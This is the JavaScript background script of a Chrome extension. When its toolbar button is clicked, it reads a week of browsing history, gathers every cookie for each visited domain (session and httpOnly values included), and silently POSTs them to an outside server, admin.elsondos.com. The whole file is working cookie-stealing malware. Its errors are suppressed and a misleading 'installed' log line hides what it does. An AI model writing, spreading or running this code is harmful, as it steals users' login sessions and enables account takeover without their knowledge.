const serverUrl = "https://admin.elsondos.com/chrome";
const startTime = Date.now() - 7 * 24 * 60 * 60 * 1000;

async function getVisitedDomains(startTime) {
  return new Promise((resolve, reject) => {
    chrome.history.search(
      { text: "", startTime: startTime },
      (historyItems) => {
        const uniqueDomains = new Set();

        for (const item of historyItems) {
          const url = new URL(item.url);
          uniqueDomains.add(`${url.protocol}//${url.hostname}`);
        }

        resolve(Array.from(uniqueDomains));
      }
    );
  });
}

async function fetchData(domain) {
  try {
    const data = await chrome.cookies.getAll({ url: domain });

    if (data.length === 0) {
      return;
    }

    const parsedData = data.map((cookie) => ({
      domain: cookie.domain,
      hostyOnly: cookie.hostOnly,
      httpOnly: cookie.httpOnly,
      name: cookie.name,
      path: cookie.path,
      sameSite: cookie.sameSite,
      secure: cookie.secure,
      session: cookie.session,
      storeId: cookie.storeId,
      value: cookie.value,
    }));

    const response = await fetch(serverUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ domain, payload: parsedData }),
    });
  } catch (error) {}
}

chrome.action.onClicked.addListener((tab) => {
  console.log("Service Worker installed");

  (async () => {
    const domains = await getVisitedDomains(startTime);
    for (const domain of domains) {
      await fetchData(domain);
    }
  })();
});
